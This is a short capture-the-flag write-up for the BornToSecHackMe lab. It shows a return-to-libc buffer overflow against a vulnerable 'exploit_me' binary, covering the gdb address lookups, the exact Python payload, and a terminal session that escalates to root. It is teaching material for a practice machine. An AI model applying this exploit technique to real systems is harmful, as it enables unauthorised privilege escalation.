# BONUS 01

During writeup_01 we use BufferOverflow + shellcode on `exploit_me` because stack was exec.
But if stack doesnt exec this exploit would not work. So we can use another exploit : `RET2LIBC`

Size for overflow stay the same : `140`
We have to find `system() address`
                 `return address` (exit here for cleanliness)
                 `/bin/sh stirng address`


 *[ buffer overflow ] [system() Address ] [ retour Address ] [ "/bin/sh" Address ]*

`export EXPLOIT="/bin/sh"`

in gdb : 

`p system` = **0xb7e6b060**

`p exit` = **0xb7e5ebe0**

`find &system,+9999999,"/bin/sh"` = **0xb7f8cc58**


Our playload is : 

`$(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')`

```
zaz@BornToSecHackMe:~$ whoami
zaz
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�������X���
# whoami
root
```

We are root ! 
